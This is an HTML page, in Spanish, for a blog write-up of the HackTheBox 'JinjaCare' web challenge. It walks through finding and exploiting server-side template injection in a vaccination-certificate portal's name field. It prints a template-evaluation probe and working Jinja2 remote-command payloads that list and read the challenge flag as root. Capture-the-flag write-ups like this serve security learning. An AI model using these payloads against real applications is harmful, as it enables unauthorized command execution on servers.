@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  JinjaCare Web Challenge - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JinjaCare Web Challenge - HackTheBox">
+  <meta name="twitter:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
+
+<meta property="og:url" content="https://celero0.github.io/posts/jinjacare/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="JinjaCare Web Challenge - HackTheBox">
+  <meta property="og:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-01T04:04:12+00:00">
+    <meta property="article:modified_time" content="2026-04-01T04:04:12+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/jinjacare/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/jinjacare/">
+              JinjaCare Web Challenge - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-04-01T04:04:12Z">
+                April 1, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Challenge #SSTI #VeryEasy #Jinja2</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>En este writeup detallaremos la solución paso a paso de un desafío de la categoría Web de HackTheBox, cuyo entorno gira en torno a JinjaCare  un portal de registro y descarga de certificados de vacunación.</p>
+<p>El objetivo principal de este reto es comprender y explotar una de las vulnerabilidades más críticas en aplicaciones web modernas: el <code>ServerSide Template Injection (SSTI)</code>. A lo largo del desafío, veremos cómo una funcionalidad aparentemente inofensiva (la generación de un certificado en PDF que refleja nuestros datos personales) se convierte en un vector de ataque directo cuando los <code>inputs</code> del usuario no son sanitizados correctamente por el motor de plantillas de backend.</p>
+<p>Como el propio nombre de la aplicación sugiere, nos enfrentaremos al motor de plantillas <code>jinja2</code> de Python. Nuestro recorrido abarcará desde la enumeración básica y registro de usuario, hasta la inyección de payloads en nuestro perfil para lograr <code>Ejecución Remota de Comandos (RCE)</code> como el usuario <code>root</code>, lo que finalmente nos permitirá leer la flag del sistema.</p>
+<h1 id="solución">
+  Solución
+  <a class="heading-link" href="#soluci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Empezamos el desafío con la IP que nos proporciona <code>HackTheBox</code>, la cual es <code>154.57.164.73:31634</code>.</p>
+<p>Al entrar a la IP nos encontramos con la siguiente página web</p>
+<img src="/images/Pasted image 20260401003907.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En cuanto a lo relevante tenemos un <code>login</code>, en el cual nos podemos registrar</p>
+<img src="/images/Pasted image 20260401003940.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Nos registramos de la siguiente forma</p>
+<img src="/images/Pasted image 20260401004018.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora iniciamos sesión, encontrándonos con el siguiente dashboard</p>
+<img src="/images/Pasted image 20260401004059.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si le damos a la opción <code>Download Certificate</code>, nos descarga el certificado de vacunación en PDF</p>
+<img src="/images/Pasted image 20260401004142.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como dato relevante, vemos que nuestro nombre sale reflejado en el certificado, lo cual permite una vía potencial de realizar un <code>Server Side Template Injection</code></p>
+<p>Si vamos al apartado de <code>Personal Info</code>, nos dan la opción de modificar el campo de <code>Full name</code></p>
+<img src="/images/Pasted image 20260401004317.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="explotando-ssti">
+  Explotando SSTI
+  <a class="heading-link" href="#explotando-ssti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Buscando en <code>PayloadsAllTheThings</code> (<a href="http://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"  class="external-link" target="_blank" rel="noopener">http://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2</a>) por payloads de <code>SSTI</code> encontramos que hay opciones para <code>Jinja2</code>, como la página se llama <code>JinjaCare</code> probaremos estos en un principio</p>
+<img src="/images/Pasted image 20260401004538.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Utilizaremos el siguiente payload para nuestro campo de <code>Full Name</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span>4*4<span style="color:#ff7b72;font-weight:bold">}}[[</span>5*5<span style="color:#ff7b72;font-weight:bold">]]</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260401004619.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Guardamos y ahora volvemos a descargar el certificado, teniendo como resultado, que la operación <code>{{4*4}}</code> se interpretó, mostrándonos el número 16, por tanto nos confirma la vulnerabilidad <code>SSTI</code>.</p>
+<img src="/images/Pasted image 20260401004658.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para realizar ejecución remota de comandos tenemos el siguiente payload</p>
+<img src="/images/Pasted image 20260401004814.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Guardamos los cambios igual que antes</p>
+<img src="/images/Pasted image 20260401004848.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Y al descargar el certificado, vemos que se ejecuta el comando correctamente, y podemos ver que el usuario el cual ejecuta los comandos es <code>root</code></p>
+<img src="/images/Pasted image 20260401004931.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="obteniendo-la-flag">
+  Obteniendo la Flag
+  <a class="heading-link" href="#obteniendo-la-flag">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Sabiendo que ahora podemos ejecutar comandos como el usuario <code>root</code>, ahora solo quedaría encontrar la <code>flag</code> y leerla, para ello utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag.txt* 2&gt;/dev/null
+</span></span></code></pre></div><p>Incorporado en el payload anterior quedaría así</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;find / -name *flag.txt* 2&gt;/dev/null&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
+</span></span></code></pre></div><p>Nos volvemos a cambiar el nombre</p>
+<img src="/images/Pasted image 20260401005140.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Descargamos el certificado, y nos muestra que el archivo que necesitamos está en el directorio raíz</p>
+<img src="/images/Pasted image 20260401005204.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto para leerlo solo debemos ocupar el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;cat /flag.txt&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260401005246.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Descargamos el certificado, y obtenemos la flag, completando el challenge</p>
+<img src="/images/Pasted image 20260401005317.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
